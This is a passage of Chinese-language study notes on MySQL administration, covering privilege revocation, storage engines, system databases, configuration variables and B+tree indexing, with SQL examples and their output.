<span class="hljs-keyword">set</span> Grant_priv<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Y&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;root&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="revoke回收权限"><a href="#revoke回收权限" class="headerlink" title="revoke回收权限"></a>revoke回收权限</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql">##查看catyer这个用户的权限<br><span class="hljs-keyword">show</span> grants <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;catyer&#x27;</span>@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------------+</span><br><span class="hljs-operator">|</span> Grants <span class="hljs-keyword">for</span> catyer<span class="hljs-variable">@10</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>.<span class="hljs-operator">%</span>                                <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-keyword">GRANT</span> USAGE <span class="hljs-keyword">ON</span> <span class="hljs-operator">*</span>.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> `catyer`@`<span class="hljs-number">10.0</span><span class="hljs-number">.0</span>.<span class="hljs-operator">%</span>`                 <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> PRIVILEGES <span class="hljs-keyword">ON</span> `zabbix`.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> `catyer`@`<span class="hljs-number">10.0</span><span class="hljs-number">.0</span>.<span class="hljs-operator">%</span>` <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------------+</span><br><br>##回收删除权限<br><span class="hljs-keyword">revoke</span> <span class="hljs-keyword">delete</span> <span class="hljs-keyword">on</span> hellodb.<span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> catyer@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span>;<br>flush privileges;<br><br>##回收所有权限<br><span class="hljs-keyword">revoke</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">on</span> hellodb.<span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> catyer@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span>;<br>flush privileges;<br></code></pre></td></tr></table></figure><h1 id="MySQL的基本架构和优化"><a href="#MySQL的基本架构和优化" class="headerlink" title="MySQL的基本架构和优化"></a>MySQL的基本架构和优化</h1><p><img src="2792175-20220828181331965-1341432725.png" alt="image-20220825220957657"></p><p>基本的MySQL架构</p><p>1.连接器connectors：负责给到各种程序进行对接，连接，例如C，JAVA(JDBC，JAVA OPEN DATABASE CONNECTION)，ODBC(Oracle database connection等)，.net等windows的程序</p><p>2.连接池，会做各种的校验，比如程序链接过来是有哪个库的权限的，或者哪个库的表权限，都需要去指定用户名/密码，会分配一个线程给到对应的用户来使用，线程是可以复用的</p><p>SQL接口：负责各种语句程序，存储过程的实现，比如DML修改(insert，update，delete，alter)，DDL(create，drop)等，视图(select)，存储过程(procedure等)</p><p>对于某个表的授权</p><p>cache &amp; buffer：将热点数据保存到读缓存(cache)和写缓存(buffers)里面</p><p>3.存储引擎：决定了MySQL在服务器上的保存方式，一般使用Innodb的存储引擎—&gt;innodb</p><p>4.MySQL服务器的管理：备份工具，恢复工具，主从同步工具，配置编译工具等</p><h2 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h2><p>主要的两种默认引擎：myisam和innodb的对比</p><p>主流还是innodb为主</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">show engine<br>innodb的优点：支持事务，行级别的锁(允许修改访问级别到行)，和外键<br>不同用户进到表里面进行修改，精确到行(row-level)<br><span class="hljs-comment">##查看MySQL数据库的存储引擎</span><br>默认使用innodb<br>show engines;<br>+--------------------+---------+----------------------------------------------------------------+--------------+------+------------+<br>| Engine             | Support | Comment                                                        | Transactions | XA   | Savepoints |<br>+--------------------+---------+----------------------------------------------------------------+--------------+------+------------+<br>| FEDERATED          | NO      | Federated MySQL storage engine                                 | NULL         | NULL | NULL       |<br>| MEMORY             | YES     | Hash based, stored <span class="hljs-keyword">in</span> memory, useful <span class="hljs-keyword">for</span> temporary tables      | NO           | NO   | NO         |<br>| InnoDB             | DEFAULT | Supports transactions, row-level locking, and foreign keys     | YES          | YES  | YES        |<br>| PERFORMANCE_SCHEMA | YES     | Performance Schema                                             | NO           | NO   | NO         |<br>| MyISAM             | YES     | MyISAM storage engine                                          | NO           | NO   | NO         |<br>| MRG_MYISAM         | YES     | Collection of identical MyISAM tables                          | NO           | NO   | NO         |<br>| BLACKHOLE          | YES     | /dev/null storage engine (anything you write to it disappears) | NO           | NO   | NO         |<br>| CSV                | YES     | CSV storage engine                                             | NO           | NO   | NO         |<br>| ARCHIVE            | YES     | Archive storage engine                                         | NO           | NO   | NO         |<br>+--------------------+---------+----------------------------------------------------------------+--------------+------+------------+<br></code></pre></td></tr></table></figure><h2 id="myIAMS和innodb存储引擎的区别"><a href="#myIAMS和innodb存储引擎的区别" class="headerlink" title="myIAMS和innodb存储引擎的区别"></a>myIAMS和innodb存储引擎的区别</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs none">innodb<br>支持：innodb支持事务(transaction)，行级别的锁(row-level)，外键(foreign key)，支持聚簇索引<br>缺点：库支持最大存储磁盘级别为64TB，但是库的大小到一定级别就会性能很差，需要分库分表执行<br><br>myiams:<br>支持：表级别的锁，适用于只读场景<br>缺点：不支持事务，外键，不支持聚簇索引<br></code></pre></td></tr></table></figure><p>存储文件格式：mysql.ibd模式，可以进到一个库的目录里面看</p><p>每个表的存储格式：.ibd格式，创建一个表，生成一个.ibd文件</p><p><img src="2792175-20220828181332502-2039802505.png" alt="image-20220827084219283"></p><p>管理数据库引擎(一般不随便动)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs sql">##查看所有存储引擎<br><span class="hljs-keyword">show</span> engines<br><br>##查看当前的存储引擎，包括临时表也是innodb<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%storage_engine%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------------------+-----------+</span><br><span class="hljs-operator">|</span> Variable_name                   <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span>     <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------------------+-----------+</span><br><span class="hljs-operator">|</span> default_storage_engine          <span class="hljs-operator">|</span> InnoDB    <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> default_tmp_storage_engine      <span class="hljs-operator">|</span> InnoDB    <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> disabled_storage_engines        <span class="hljs-operator">|</span>           <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> internal_tmp_mem_storage_engine <span class="hljs-operator">|</span> TempTable <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------------------+-----------+</span><br><br>##在系统上指定默认的存储引擎<br>vim <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>my.cnf<br>[mysqld]<br>default_storage_engine<span class="hljs-operator">=</span>InnoDB <br><br>##查看某张表的存储引擎，<span class="hljs-keyword">like</span>后面加上表名<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">table</span> status <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;testlog&#x27;</span> \G<br><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span> <span class="hljs-number">1.</span> <span class="hljs-type">row</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><br>           Name: testlog<br>         Engine: InnoDB<br>        Version: <span class="hljs-number">10</span><br>     Row_format: <span class="hljs-keyword">Dynamic</span><br>           <span class="hljs-keyword">Rows</span>: <span class="hljs-number">98399</span><br> Avg_row_length: <span class="hljs-number">48</span><br>    Data_length: <span class="hljs-number">4734976</span><br>Max_data_length: <span class="hljs-number">0</span><br>   Index_length: <span class="hljs-number">0</span><br>      Data_free: <span class="hljs-number">0</span><br> Auto_increment: <span class="hljs-number">100001</span><br>    Create_time: <span class="hljs-number">2022</span><span class="hljs-number">-08</span><span class="hljs-number">-20</span> <span class="hljs-number">16</span>:<span class="hljs-number">37</span>:<span class="hljs-number">08</span><br>    Update_time: <span class="hljs-keyword">NULL</span><br>     Check_time: <span class="hljs-keyword">NULL</span><br>      <span class="hljs-keyword">Collation</span>: utf8mb3_general_ci<br>       Checksum: <span class="hljs-keyword">NULL</span><br> Create_options: <br>        Comment: <br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><h2 id="MySQL中的系统数据库"><a href="#MySQL中的系统数据库" class="headerlink" title="MySQL中的系统数据库"></a>MySQL中的系统数据库</h2><p>最好是不要修改，动他，一般都是mysql库修改用户等</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql">新的库一般包含：<br>information_schema<br>mysql<br>performance_schema<br>sys<br><br>##mysql库：一般都需要进到mysql库内去操作用户，用户权限授权<br>use mysql<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> xxx@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;xxx&#x27;</span><br><span class="hljs-keyword">grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">on</span> wordpress.<span class="hljs-operator">*</span> <span class="hljs-keyword">to</span> xxx@<span class="hljs-string">&#x27;%&#x27;</span><br>flush privileges;<br><br><br>information_schema：元数据存储<br>performance_schema：性能表<br>sys：performance_schema精简版<br></code></pre></td></tr></table></figure><h1 id="MySQL变量和配置选项"><a href="#MySQL变量和配置选项" class="headerlink" title="MySQL变量和配置选项"></a>MySQL变量和配置选项</h1><p>变量和配置选项不同</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">##服务器选项和变量<br>分类：<br><span class="hljs-number">1.</span><span class="hljs-keyword">global</span>变量 <br><span class="hljs-number">2.</span>session变量(单会话框)<br><span class="hljs-number">3.</span><span class="hljs-keyword">dynamic</span>动态变量，可以动态修改，在内存内直接修改<br></code></pre></td></tr></table></figure><p>常见的服务器变量，一般是配置常见的服务器变量，比如id，binlog开启，数据目录，服务器sooket，错误日志，pid进程(关乎到启动脚本)等</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs sql">##一般是进入到[mysqld]服务器内进行配置<br>vim <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>my.cnf<br>[mysqld]<br>server<span class="hljs-operator">-</span>id<span class="hljs-operator">=</span><span class="hljs-number">132</span><br>log<span class="hljs-operator">-</span>bin<br>datadir<span class="hljs-operator">=</span><span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>mysql<br>socket<span class="hljs-operator">=</span><span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>mysql<span class="hljs-operator">/</span>mysql.sock                                                                                                   <br>log<span class="hljs-operator">-</span>error<span class="hljs-operator">=</span><span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>mysql<span class="hljs-operator">/</span>mysql.log<br>pid<span class="hljs-operator">-</span>file<span class="hljs-operator">=</span><span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>mysql<span class="hljs-operator">/</span>mysql.pid<br>#<span class="hljs-keyword">skip</span><span class="hljs-operator">-</span><span class="hljs-keyword">grant</span><span class="hljs-operator">-</span>tables<br>#default_authentication_plugin<span class="hljs-operator">=</span>mysql_native_password<br><br>[client]<br>socket<span class="hljs-operator">=</span><span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>mysql<span class="hljs-operator">/</span>mysql.sock<br><br><br>##mysql <span class="hljs-comment">--verbose --help</span><br>Variables (<span class="hljs-comment">--variable-name=value)</span><br><span class="hljs-keyword">and</span> <span class="hljs-type">boolean</span> options &#123;<span class="hljs-literal">FALSE</span><span class="hljs-operator">|</span><span class="hljs-literal">TRUE</span>&#125;          <span class="hljs-keyword">Value</span> (after reading options)<br><span class="hljs-comment">----------------------------------------- --------------------------------</span><br>auto<span class="hljs-operator">-</span>rehash                               <span class="hljs-literal">TRUE</span><br>auto<span class="hljs-operator">-</span>vertical<span class="hljs-operator">-</span>output                      <span class="hljs-literal">FALSE</span><br>bind<span class="hljs-operator">-</span>address                              (<span class="hljs-keyword">No</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">value</span>)<br><span class="hljs-type">binary</span><span class="hljs-operator">-</span><span class="hljs-keyword">as</span><span class="hljs-operator">-</span>hex                             <span class="hljs-literal">FALSE</span><br><span class="hljs-type">character</span><span class="hljs-operator">-</span>sets<span class="hljs-operator">-</span>dir                        (<span class="hljs-keyword">No</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">value</span>)<br><span class="hljs-keyword">column</span><span class="hljs-operator">-</span>type<span class="hljs-operator">-</span>info                          <span class="hljs-literal">FALSE</span><br></code></pre></td></tr></table></figure><h1 id="MySQL索引"><a href="#MySQL索引" class="headerlink" title="MySQL索引"></a>MySQL索引</h1><p>提高数据库查询的效率，主要还是查询，要查询的内容加上次序，这个表建立索引一般在读操作远远大于写操作的基础上，如果进行频繁修改的话，索引需要不断的更新</p><p>优点：</p><p>1.可以降低扫描的次数，提高IO</p><p>2.进行良好的排序</p><p>缺点：占用额外磁盘空间，如果写操作次数多余读操作次数，则需要不停的去更新索引，从而影响了库的性能</p><h2 id="常见数据结构索引类型"><a href="#常见数据结构索引类型" class="headerlink" title="常见数据结构索引类型"></a>常见数据结构索引类型</h2><p>B+tree索引：常见的索引架构，任意字段的数据，不限制</p><p>hash索引：精确查找</p><p>主键索引：基于主键做的索引，比如订单表，就是以订单编号(假设auto_increment)，根据这个来查询</p><p>聚簇索引：数据+索引放在一起，数据为.idb类型的文件，索引为.idx类型的文件</p><h3 id="二叉树形态"><a href="#二叉树形态" class="headerlink" title="二叉树形态"></a>二叉树形态</h3><p>有树根的情况，一直往下建立索引查询，二分法，以树根为基准，比如说左边是小于树根的，右边是大于树根的，然后两种依次往下排，每个分支节点都是这么分的排序方法，依次往下排</p><p>每当有大于或者小于的数字，分为放在右边和左边</p><p><a href="https://www.cs.usfca.edu/~galles/visualization/BST.html">Binary Search Tree Visualization (usfca.edu)</a></p><p><img src="2792175-20220828181332807-701284451.png" alt="image-20220827143011464"></p><h3 id="B-tree索引：balance-index"><a href="#B-tree索引：balance-index" class="headerlink" title="B-tree索引：balance index"></a>B-tree索引：balance index</h3><p>特点：平衡性好，比纯二叉树的话，覆盖到所有的数据；</p><p>硬盘1（页1—&gt;16K的大小）：存放17号和35号的学生信息，有p1，p2，p3三个指针指向三个range：&lt;17，17&lt;x&lt;35，x&gt;35，三个范围内出现三个硬盘快，再依次往下分，直到不能分为止</p><p>优点：比二叉树索引更加平衡，能找到所有范围内的数据</p><p>缺点：需要遍历太多次了，如果有些数据在最底层，影响程序性能，看查询的数据是什么数据</p><p><img src="2792175-20220828181333197-1457857707.png" alt="image-20220827142611865"></p><h3 id="B-tree索引-mysql使用"><a href="#B-tree索引-mysql使用" class="headerlink" title="B+tree索引(mysql使用)"></a>B+tree索引(mysql使用)</h3><p>关系型数据库常用的索引算法</p><p>特点：根节点+分支节点(一共两层)，存放的都是索引的东西，而不存放数据，索引的内容比如是1个数字+指针</p><p>5+p1,20+p2,60+p3,</p><p>5-20又可以分为5-p1，10-P2，20-p3等等，在这里往下第三层才开始放数据，1条记录假设占用1K的空间</p><p>优势：树的层数一般就是2-3层，IO快，适用于普遍的情况，同时表下面加上了链表，二层每个索引下面的数据都是有链接关系的，可以直接跳转，不用又从根上开始找，大大提升找查询的效率</p><p>查询路径：根据索引查询</p><p>查询条件限定：左前缀排序法，因为索引一般都是根据一定的排序方式进行建立的，比如查询所有1000开头的订单号记录ok，查询包含520的订单记录，就不行，或者查询某个用户的订单，OK</p><p><img src="2792175-20220828181333585-1334419259.png" alt="image-20220827162243054"></p><p>面试题：innbodb中一个B+树可以放多少条记录？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript">假设：<span class="hljs-number">2</span>层架构+数据<br>根节点：<span class="hljs-number">1</span>个索引=数字+指针，<span class="hljs-number">10</span>个字节，存放一个索引的页为16K大小，可以放<span class="hljs-number">1.</span>6K条索引<br>分支节点：<br>一条记录：1K的占用，<span class="hljs-number">1</span>页能放：<span class="hljs-number">16</span>条记录=16K，<span class="hljs-number">1</span>条索引对应<span class="hljs-number">16</span>条记录，<span class="hljs-number">1</span>个分支可放：<span class="hljs-number">1.</span>6k*<span class="hljs-number">16</span>=<span class="hljs-number">25600</span>条记录<br>一共有包括根节点：<span class="hljs-number">1.</span>6k*<span class="hljs-number">25600</span>记录=<span class="hljs-number">40960000</span>条记录<br>一个<span class="hljs-title class_">MySQL</span>库最多能放这么多条记录，但是实际生产环境下，超过千万条就最好是分库了<br></code></pre></td></tr></table></figure><h2 id="管理索引语句"><a href="#管理索引语句" class="headerlink" title="管理索引语句"></a>管理索引语句</h2><p>适用场景：一个表内，最好是2-3个索引就OK，一般用于经常查询的字段，比如ID，货品名称等，索引多了也会带来额外的损耗</p><p>索引—-&gt;一定是基于某张表的，不同的表可以建立属于表自己的索引</p><p>MySQL库有自己的优化器，一般会选择用不用自建的索引来查询，一般来说对于单表都会使用的，基本都是B+TREE索引</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sql">##创建索引，查看某张表的索引，删除索引<br><span class="hljs-keyword">create</span> index name <span class="hljs-keyword">on</span> testlog(name);<br><span class="hljs-keyword">show</span> indexes <span class="hljs-keyword">from</span> testlog\G; <span class="hljs-keyword">show</span> index <span class="hljs-keyword">from</span> testlog;<br><span class="hljs-keyword">drop</span> index idex_salary <span class="hljs-keyword">on</span> testlog;<br><br><br>##查看表结构，stuid为主键，自增长<br><span class="hljs-keyword">desc</span> students<br><span class="hljs-operator">+</span><span class="hljs-comment">-----------+------------------+------+-----+---------+----------------+</span><br><span class="hljs-operator">|</span> Field     <span class="hljs-operator">|</span> Type             <span class="hljs-operator">|</span> <span class="hljs-keyword">Null</span> <span class="hljs-operator">|</span> Key <span class="hljs-operator">|</span> <span class="hljs-keyword">Default</span> <span class="hljs-operator">|</span> Extra          <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----------+------------------+------+-----+---------+----------------+</span><br><span class="hljs-operator">|</span> StuID     <span class="hljs-operator">|</span> <span class="hljs-type">int</span> unsigned     <span class="hljs-operator">|</span> <span class="hljs-keyword">NO</span>   <span class="hljs-operator">|</span> PRI <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> auto_increment <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Name      <span class="hljs-operator">|</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>)      <span class="hljs-operator">|</span> <span class="hljs-keyword">NO</span>   <span class="hljs-operator">|</span>     <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span>                <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Age       <span class="hljs-operator">|</span> tinyint unsigned <span class="hljs-operator">|</span> <span class="hljs-keyword">NO</span>   <span class="hljs-operator">|</span>     <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span>                <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> Gender    <span class="hljs-operator">|</span> enum(<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>)    <span class="hljs-operator">|</span> <span class="hljs-keyword">NO</span>   <span class="hljs-operator">|</span>     <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span>                <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> ClassID   <span class="hljs-operator">|</span> tinyint unsigned <span class="hljs-operator">|</span> YES  <span class="hljs-operator">|</span>     <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span>                <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> TeacherID <span class="hljs-operator">|</span> <span class="hljs-type">int</span> unsigned     <span class="hljs-operator">|</span> YES  <span class="hljs-operator">|</span>     <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span>                <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----------+------------------+------+-----+---------+----------------+</span><br><span class="hljs-number">6</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>##查找某个表的索引，索引类型为btree索引，默认都是btree索引，默认都是b<span class="hljs-operator">+</span>tree索引<br>##主键索引<span class="hljs-operator">+</span>STUID为主键<br><span class="hljs-keyword">show</span> index <span class="hljs-keyword">from</span> students\G;<br><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span> <span class="hljs-number">1.</span> <span class="hljs-type">row</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><br>        <span class="hljs-keyword">Table</span>: students<br>   Non_unique: <span class="hljs-number">0</span><br>     Key_name: <span class="hljs-keyword">PRIMARY</span><br> Seq_in_index: <span class="hljs-number">1</span><br>  Column_name: StuID<br>    <span class="hljs-keyword">Collation</span>: A<br>  <span class="hljs-keyword">Cardinality</span>: <span class="hljs-number">25</span><br>     Sub_part: <span class="hljs-keyword">NULL</span><br>       Packed: <span class="hljs-keyword">NULL</span><br>         <span class="hljs-keyword">Null</span>: <br>   Index_type: BTREE<br>      Comment: <br>Index_comment: <br>      Visible: YES<br>   Expression: <span class="hljs-keyword">NULL</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.01</span> sec)<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181333908-1357973310.png" alt="image-20220827174209385"></p><p>查看是否有利用索引来进行查询：explain</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">explain <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> hellodb.students <span class="hljs-keyword">where</span> stuid<span class="hljs-operator">=</span><span class="hljs-number">6</span>;<br>key：是<span class="hljs-keyword">primary</span>，证明就是主键索引，有利用索引的<br><span class="hljs-keyword">rows</span>：表示扫描了多少行得出来的<br></code></pre></td></tr></table></figure><p><img 